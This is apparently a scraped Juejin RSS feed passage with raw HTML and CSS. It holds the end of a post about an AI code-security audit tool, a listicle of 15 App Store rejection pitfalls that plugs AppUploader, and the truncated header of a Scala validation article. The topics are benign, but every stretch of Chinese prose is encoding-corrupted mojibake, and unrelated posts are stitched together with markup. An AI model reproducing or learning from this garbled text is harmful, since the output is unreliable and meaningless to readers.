<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce76163c65c34e61afe656c488fcca61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=Vgni0EorZMbDMwUAdIZSW4tkkLg%3D" alt="" loading="lazy"/></p>
<p>æƒ³æƒ³æˆ‘å¤§å­¦çš„æ—¶å€™åšè¯¾è®¾ä½œä¸šï¼Œè¦æ˜¯æœ‰ AI å¸®å¿™ç”Ÿæˆè¿™ç§æŠ¥å‘Šï¼Œä¸å¾—çˆ½é£è¾¹å­äº†ï¼Ÿ</p>
<p>é™¤äº†é¡¹ç›®å®¡è®¡ï¼Œä½œè€…è¿˜æä¾›äº†å³æ—¶åˆ†æåŠŸèƒ½ã€‚ä¸è¿‡è¿™ä¸ªå°±æ²¡ä»€ä¹ˆæ–°æ„äº†ï¼Œæˆ‘ä»¬å›¢é˜Ÿçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcodecopy.cn%2F" target="_blank" title="https://codecopy.cn/" ref="nofollow noopener noreferrer">ä»£ç å°æŠ„</a>åœ¨ 24 å¹´åˆå°±å·²ç»ä¸Šçº¿äº†è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaf5bece523543bbbb3a2dea800aae29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=rUfd8Ox5oH%2B9QV2anW0v8nMRf3M%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä½“éªŒè¿™ä¸ªé¡¹ç›®çš„æ—¶å€™ï¼Œè¿˜æœ‰å¾ˆå¤šåŠŸèƒ½æ²¡åšå®Œï¼Œä¸è¿‡è¿™ä¹Ÿæ˜¯ MVP æœ€å°å¯è¡Œäº§å“åŸåˆ™å˜›ï¼Œå¿«é€ŸéªŒè¯æƒ³æ³•æœ€é‡è¦ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2a514e0d6d4727bc33e591ab2e7113~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=qLgD%2BMgancWFUFHZJzazjrCYEpw%3D" alt="" loading="lazy"/></p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½œè€…æ›´æ–°éå¸¸é¢‘ç¹ã€‚æˆªæ­¢åˆ°ç›®å‰ï¼Œé¡¹ç›®ç•Œé¢å·²ç»ç„•ç„¶ä¸€æ–°äº†ï¼Œæ›´æœ‰æå®¢èŒƒå„¿ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcc6ba8991ff4cefa4a51253640502e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=jzCjNY3nxufTFEfAr0wUc0Z5AsE%3D" alt="" loading="lazy"/></p>
<p>åœ¨å®¡è®¡æµæ—¥å¿—é¡µé¢å¯ä»¥çœ‹åˆ° AI æ€è€ƒåˆ†æçš„è¿‡ç¨‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/541f377ba68a48e6820bcb1dedd89d8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=XGASWpH5doDuZJX6Zjic2pWYD88%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰æ™ºèƒ½ä»ªè¡¨ç›˜ï¼Œå¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ä»£ç è´¨é‡è¶‹åŠ¿ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d915b863adf6426795a91de3a86669b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=3hX4mwpQdMIL3t9D9UlqGKkytos%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">æœ€å</h2>
<p>è¿™ä¸ªé¡¹ç›®çš„å®ç°æ€è·¯å…¶å®æŒºå€¼å¾—å­¦ä¹ çš„ã€‚é€šè¿‡è°ƒç”¨å¤§æ¨¡å‹çš„ APIï¼Œè®© AI ç†è§£ä»£ç é€»è¾‘ï¼Œç„¶åæ ¹æ®å¸¸è§çš„å®‰å…¨æ¼æ´æ¨¡å¼å’Œæœ€ä½³å®è·µè¿›è¡Œåˆ†æï¼Œæœ€åç”Ÿæˆç»“æ„åŒ–çš„å®¡è®¡æŠ¥å‘Šã€‚æ•´ä¸ªæµç¨‹å’Œ AI ä»£ç å®¡æŸ¥æ˜¯ç±»ä¼¼çš„ï¼Œä½†æ›´ä¸“æ³¨äºå®‰å…¨æ¼æ´çš„å‘ç°ã€‚</p>
<p><img src="https://pic.yupi.icu/1/%25E6%259E%25B6%25E6%259E%2584%25E5%259B%25BE.png" alt="DeepAudit æ¶æ„å›¾" loading="lazy"/></p>
<p>å¯¹äºä¸ªäººå¼€å‘è€…æ¥è¯´ï¼Œè¿™ç±»å·¥å…·å¯ä»¥å¸®ä½ åœ¨æäº¤ä»£ç å‰å‘ç°æ½œåœ¨é—®é¢˜ï¼Œæ‹¿æ¥æ£€æµ‹ä¸€ä¸‹è‡ªå·±ä¹‹å‰çš„è€é¡¹ç›®ä»£ç ä¹Ÿæ˜¯ä¸é”™çš„ï¼›å¯¹äºå›¢é˜Ÿæ¥è¯´ï¼Œå¯ä»¥æŠŠ AI æ¥å…¥åˆ° CI/CD æµç¨‹ä¸­ï¼Œè‡ªåŠ¨åŒ–ä»£ç å®‰å…¨æ£€æŸ¥ã€‚è™½ç„¶æœ¬é¡¹ç›®æš‚æ—¶è¿˜æœ‰è¯¯æŠ¥ï¼Œä½†éšç€ AI èƒ½åŠ›çš„æå‡ï¼Œä»¥åŠä½œè€…åœ¨é¢†åŸŸçŸ¥è¯†æ–¹é¢çš„å¡«å……ï¼Œç›¸ä¿¡ä¼šè¶Šæ¥è¶Šå‡†ç¡®ã€‚</p>
<p>æ¥è¯•è¯•çœ‹ï¼Œä½ çš„é¡¹ç›®ä»£ç é‡Œæœ‰å¤šå°‘ä¸ª Bugï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21b51aacd4ee42cfb1159a394a162f73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=lbr2m6qV0oYb76L3iCdBtvJWKUc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">æ›´å¤š</h2>
<p>ğŸ’» ç¼–ç¨‹å­¦ä¹ äº¤æµï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fcode-nav" target="_blank" title="https://github.com/liyupi/code-nav" ref="nofollow noopener noreferrer">ç¼–ç¨‹å¯¼èˆª</a> ğŸ“ƒ ç®€å†å¿«é€Ÿåˆ¶ä½œï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Flaoyujianli" target="_blank" title="https://github.com/liyupi/laoyujianli" ref="nofollow noopener noreferrer">è€é±¼ç®€å†</a> âœï¸ é¢è¯•åˆ·é¢˜ç¥å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fmianshiya" target="_blank" title="https://github.com/liyupi/mianshiya" ref="nofollow noopener noreferrer">é¢è¯•é¸­</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸Šæ¶è‹¹æœApp Storeæ—¶å¼€å‘è€…å¸¸å¿½ç•¥çš„15ä¸ªé—®é¢˜åŠè§£å†³æ–¹æ³•]]></title>    <link>https://juejin.cn/post/7589275237037146147</link>    <guid>https://juejin.cn/post/7589275237037146147</guid>    <pubDate>2025-12-30T03:55:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589275237037146147" data-draft-id="7589308109639958563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸Šæ¶è‹¹æœApp Storeæ—¶å¼€å‘è€…å¸¸å¿½ç•¥çš„15ä¸ªé—®é¢˜åŠè§£å†³æ–¹æ³•"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-30T03:55:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒçŒ´çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸Šæ¶è‹¹æœApp Storeæ—¶å¼€å‘è€…å¸¸å¿½ç•¥çš„15ä¸ªé—®é¢˜åŠè§£å†³æ–¹æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒçŒ´çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:55:33.000Z" title="Tue Dec 30 2025 03:55:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šæ¶è‹¹æœAppå•†åŸæ—¶å®¹æ˜“å¿½ç•¥çš„é—®é¢˜</p>
<p>åœ¨ä¸Šæ¶è‹¹æœAppå•†åŸçš„è¿‡ç¨‹ä¸­ï¼Œå¼€å‘è€…å¾€å¾€éœ€è¦é¢å¯¹è‹¹æœå…¬å¸æå…¶ä¸¥æ ¼ä¸”ä¸æ–­æ›´æ–°çš„å®¡æ ¸æ ‡å‡†ä½“ç³»ã€‚æ®è‹¹æœå®˜æ–¹æ•°æ®æ˜¾ç¤ºï¼Œçº¦æœ‰30%çš„Appåˆæ¬¡æäº¤ä¼šå› å„ç±»ç»†èŠ‚é—®é¢˜è¢«æ‹’ç»ï¼Œå…¶ä¸­è®¸å¤šçœ‹ä¼¼å¾®å°çš„ç–æ¼éƒ½å¯èƒ½å¯¼è‡´å®¡æ ¸å¤±è´¥ã€ä¸Šæ¶å»¶è¿Ÿç”šè‡³åº”ç”¨ä¸‹æ¶çš„é£é™©ã€‚è¿™äº›æ ‡å‡†ä¸ä»…æ¶µç›–æŠ€æœ¯æ€§èƒ½ã€å†…å®¹åˆè§„ç­‰åŸºç¡€ç»´åº¦ï¼Œè¿˜å»¶ä¼¸è‡³ç”¨æˆ·éšç§ä¿æŠ¤ã€æ— éšœç¢è®¾è®¡ã€å•†ä¸šæ¨¡å¼é€æ˜åº¦ç­‰æ·±å±‚è¦æ±‚ï¼Œä¸”å®¡æ ¸å›¢é˜Ÿä¼šç»“åˆå¸‚åœºåé¦ˆåŠ¨æ€è°ƒæ•´è¯„ä¼°å°ºåº¦ã€‚ä»¥ä¸‹æ˜¯ç»è¿‡å¤§é‡å¼€å‘è€…å®è·µéªŒè¯åæ€»ç»“å‡ºçš„ã€æœ€å®¹æ˜“è¢«å¿½è§†ä½†å¯¹å®¡æ ¸ç»“æœè‡³å…³é‡è¦çš„æ³¨æ„äº‹é¡¹æ¸…å•ï¼š</p>
<p>1.Â <strong>éšç§æ”¿ç­–é“¾æ¥ç¼ºå¤±æˆ–å†…å®¹ä¸å®Œå–„</strong></p>
<p>æœªåœ¨App Store Connectåå°æˆ–åº”ç”¨å†…æ˜¾è‘—ä½ç½®æä¾›æœ‰æ•ˆçš„éšç§æ”¿ç­–é“¾æ¥ï¼Œå°¤å…¶æ˜¯æ¶‰åŠç”¨æˆ·æ•°æ®æ”¶é›†ã€å­˜å‚¨æˆ–å…±äº«çš„Appï¼Œè‹¹æœè¦æ±‚å¿…é¡»æ˜ç¡®è¯´æ˜æ•°æ®æ”¶é›†çš„ç±»å‹ã€ä½¿ç”¨ç›®çš„ã€å­˜å‚¨æœŸé™åŠç¬¬ä¸‰æ–¹å…±äº«æƒ…å†µã€‚éšç§æ”¿ç­–éœ€ç¬¦åˆå…¨çƒå„åœ°æ³•è§„ï¼ˆå¦‚GDPRã€CCPAç­‰ï¼‰ï¼Œä¸”å†…å®¹éœ€ä¸å®é™…æ•°æ®å¤„ç†è¡Œä¸ºä¸€è‡´ï¼Œé¿å…å‡ºç°æ¨¡ç³Šè¡¨è¿°æˆ–è™šå‡æ‰¿è¯ºã€‚</p>
<p>2.Â <strong>åº”ç”¨æˆªå›¾ä¸ç¬¦åˆè§„èŒƒ</strong></p>
<p>æˆªå›¾å°ºå¯¸ä¸æ­£ç¡®ã€åŒ…å«éå®˜æ–¹å…ƒç´ ï¼ˆå¦‚å…¶ä»–å¹³å°çš„æ ‡è¯†ï¼‰æˆ–ä¸å®é™…åº”ç”¨ç•Œé¢ä¸ç¬¦ï¼Œå¯èƒ½å¯¼è‡´å®¡æ ¸è¢«æ‹’ã€‚ä½¿ç”¨AppUploaderå¯ä»¥æ–¹ä¾¿åœ°ä¸Šä¼ å’Œç®¡ç†åº”ç”¨æˆªå›¾ï¼Œç¡®ä¿å®ƒä»¬ç¬¦åˆè‹¹æœçš„è§„èŒƒè¦æ±‚ã€‚</p>
<p>3.Â <strong>ç¼ºå°‘è¯¦ç»†çš„Appæè¿°</strong></p>
<p>åº”ç”¨æè¿°è¿‡äºç®€ç•¥ï¼Œæœªèƒ½æ¸…æ™°è¯´æ˜æ ¸å¿ƒåŠŸèƒ½ã€ç›®æ ‡ç”¨æˆ·åŠä½¿ç”¨åœºæ™¯ï¼Œå½±å“å®¡æ ¸äººå‘˜å¯¹Appçš„ç†è§£ã€‚</p>
<p>4.Â <strong>æœªé€‚é…æœ€æ–°iOSç‰ˆæœ¬</strong></p>
<p>Appæœªé’ˆå¯¹æœ€æ–°çš„iOSç³»ç»Ÿè¿›è¡Œä¼˜åŒ–ï¼Œå¯èƒ½å­˜åœ¨å…¼å®¹æ€§é—®é¢˜æˆ–æ— æ³•æ­£å¸¸è¿è¡Œçš„æƒ…å†µã€‚</p>
<p>5.Â <strong>æƒé™è¯·æ±‚ä¸åˆç†</strong></p>
<p>è¯·æ±‚äº†ä¸å¿…è¦çš„ç”¨æˆ·æƒé™ï¼ˆå¦‚è®¿é—®ç…§ç‰‡ã€ä½ç½®ç­‰ï¼‰ï¼Œä½†æœªåœ¨Appä¸­å®é™…ä½¿ç”¨è¿™äº›æƒé™ï¼Œè¿åè‹¹æœçš„æƒé™ç®¡ç†è§„å®šã€‚</p>
<p>6.Â <strong>æµ‹è¯•è´¦å·ä¿¡æ¯æœªæä¾›</strong></p>
<p>å¦‚æœAppéœ€è¦ç™»å½•æ‰èƒ½ä½“éªŒå®Œæ•´åŠŸèƒ½ï¼Œæœªæä¾›æµ‹è¯•è´¦å·å’Œå¯†ç å¯èƒ½å¯¼è‡´å®¡æ ¸äººå‘˜æ— æ³•å…¨é¢è¯„ä¼°Appã€‚AppUploaderæ”¯æŒæµ‹è¯•è®¾å¤‡UDIDç®¡ç†å’ŒIPAå®‰è£…æµ‹è¯•ï¼Œæ–¹ä¾¿å¼€å‘è€…æä¾›æµ‹è¯•è´¦å·è¿›è¡Œå®¡æ ¸ã€‚</p>
<p>7.Â <strong>å†…è´­é¡¹ç›®é…ç½®é”™è¯¯</strong></p>
<p>å¯¹äºåŒ…å«å†…è´­åŠŸèƒ½çš„Appï¼Œæœªæ­£ç¡®é…ç½®å†…è´­é¡¹ç›®æˆ–ä»·æ ¼è®¾ç½®ä¸å½“ï¼Œå¯èƒ½å¼•å‘å®¡æ ¸å¤±è´¥ã€‚AppUploaderæä¾›äº†å†…è´­æœ¬åœ°åŒ–ä¿¡æ¯æ‰¹é‡ä¸Šä¼ åŠŸèƒ½ï¼Œå¸®åŠ©æ­£ç¡®é…ç½®å†…è´­å†…å®¹ã€‚</p>
<p>8.Â <strong>è¿åè®¾è®¡è§„èŒƒ</strong></p>
<p>ç•Œé¢è®¾è®¡ä¸ç¬¦åˆè‹¹æœçš„äººæœºäº¤äº’æŒ‡å—ï¼ˆHuman Interface Guidelinesï¼‰ï¼Œä¾‹å¦‚æŒ‰é’®è¿‡å°ã€æ’ç‰ˆæ··ä¹±ç­‰é—®é¢˜ã€‚</p>
<p>9.Â <strong>æœªå¤„ç†æ•æ„Ÿå†…å®¹</strong></p>
<p>åŒ…å«æ•æ„Ÿå†…å®¹ï¼ˆå¦‚æš´åŠ›ã€æ”¿æ²»ã€è‰²æƒ…ç­‰ï¼‰æˆ–æœªæŒ‰è¦æ±‚åŠ å…¥å¹´é¾„åˆ†çº§é™åˆ¶ï¼Œå¯èƒ½å¯¼è‡´ç›´æ¥æ‹’ç»ã€‚</p>
<p>10.Â <strong>æ¨é€é€šçŸ¥æ»¥ç”¨</strong></p>
<p>æœªç»ç”¨æˆ·åŒæ„é¢‘ç¹å‘é€æ¨é€é€šçŸ¥ï¼Œæˆ–æ¨é€å†…å®¹ä¸ç¬¦åˆè‹¹æœçš„è§„å®šï¼Œä¼šå¼•å‘ç”¨æˆ·ä½“éªŒé—®é¢˜å¹¶å¯¼è‡´å®¡æ ¸å—é˜»ã€‚</p>
<p>11.Â <strong>æ–‡ä»¶ä½“ç§¯è¿‡å¤§</strong></p>
<p>å¦‚æœAppå®‰è£…åŒ…è¶…è¿‡è‹¹æœæ¨èçš„å¤§å°é™åˆ¶ï¼ˆé€šå¸¸ä¸º200MBï¼‰ï¼Œéœ€ç¡®ä¿é€šè¿‡èœ‚çªç½‘ç»œä¸‹è½½æ—¶ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
<p>12.Â <strong>å…ƒæ•°æ®ä¸ä¸€è‡´</strong></p>
<p>Appæ ‡é¢˜ã€å…³é”®è¯ã€åˆ†ç±»ç­‰å…ƒæ•°æ®ä¹‹é—´å­˜åœ¨çŸ›ç›¾æˆ–æ¨¡ç³Šè¡¨è¿°ï¼Œä¼šè®©å®¡æ ¸å›¢é˜Ÿéš¾ä»¥åˆ¤æ–­å…¶çœŸå®ç”¨é€”ã€‚AppUploaderå…è®¸æ‰¹é‡ä¸Šä¼ åº”ç”¨å…ƒæ•°æ®ï¼Œå¦‚æè¿°å…³é”®è¯å’Œå¤šè¯­è¨€ç‰ˆæœ¬ï¼Œç¡®ä¿ä¸€è‡´æ€§ã€‚</p>
<p>13.Â <strong>ç¼ºä¹æ³•å¾‹åˆè§„å£°æ˜</strong></p>
<p>æ¶‰åŠç‰ˆæƒã€å•†æ ‡æˆ–å…¶ä»–æ³•å¾‹ç›¸å…³çš„å†…å®¹æ—¶ï¼Œæœªé™„å¸¦å¿…è¦çš„å£°æ˜æˆ–è¯æ˜ææ–™ï¼Œå®¹æ˜“å¼•å‘æ³•å¾‹é£é™©ã€‚</p>
<p>14.Â <strong>å¿½è§†å¤šè¯­è¨€æ”¯æŒ</strong></p>
<p>è‹¥ç›®æ ‡å¸‚åœºåŒ…å«å¤šä¸ªå›½å®¶/åœ°åŒºï¼Œæœªæä¾›ç›¸åº”çš„å¤šè¯­è¨€æ”¯æŒï¼Œä¼šä½¿éƒ¨åˆ†ç”¨æˆ·éš¾ä»¥ç†è§£Appå†…å®¹ã€‚</p>
<p>15.Â <strong>æœªè§£å†³å´©æºƒé—®é¢˜</strong></p>
<p>åœ¨æµ‹è¯•é˜¶æ®µå‘ç°çš„ä»»ä½•å´©æºƒæˆ–å¡é¡¿ç°è±¡æœªå½»åº•ä¿®å¤ï¼Œå°†ä¸¥é‡å½±å“å®¡æ ¸é€šè¿‡ç‡ã€‚</p>
<p>ä»¥ä¸Šé—®é¢˜å‡éœ€åœ¨æäº¤å‰ä»”ç»†æ£€æŸ¥ï¼Œä»¥æé«˜AppæˆåŠŸä¸Šæ¶çš„æ¦‚ç‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Scala æŠ€å·§ã€‘ç”¨éšå¼ç±»ç»™ String â€œå¼€æŒ‚â€ï¼šä¸€è¡Œä»£ç å®ç°æ‰‹æœºå· / èº«ä»½è¯å·æ ¡éªŒ]]></title>    <link>https://juejin.cn/post/7589207843788161059</link>    <guid>https://juejin.cn/post/7589207843788161059</guid>    <pubDate>2025-12-30T03:28:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207843788161059" data-draft-id="7589186347585814562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Scala æŠ€å·§ã€‘ç”¨éšå¼ç±»ç»™ String â€œå¼€æŒ‚â€ï¼šä¸€è¡Œä»£ç å®ç°æ‰‹æœºå· / èº«ä»½è¯å·æ ¡éªŒ"/> <meta itemprop="keywords" content="Scala"/> <meta itemprop="datePublished" content="2025-12-30T03:28:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç äºè€æ€»"/> <meta itemprop="url" content="https://juejin.cn/user/582105100725436"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Scala æŠ€å·§ã€‘ç”¨éšå¼ç±»ç»™ String â€œå¼€æŒ‚â€ï¼šä¸€è¡Œä»£ç å®ç°æ‰‹æœºå· / èº«ä»½è¯å·æ ¡éªŒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/582105100725436/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç äºè€æ€»
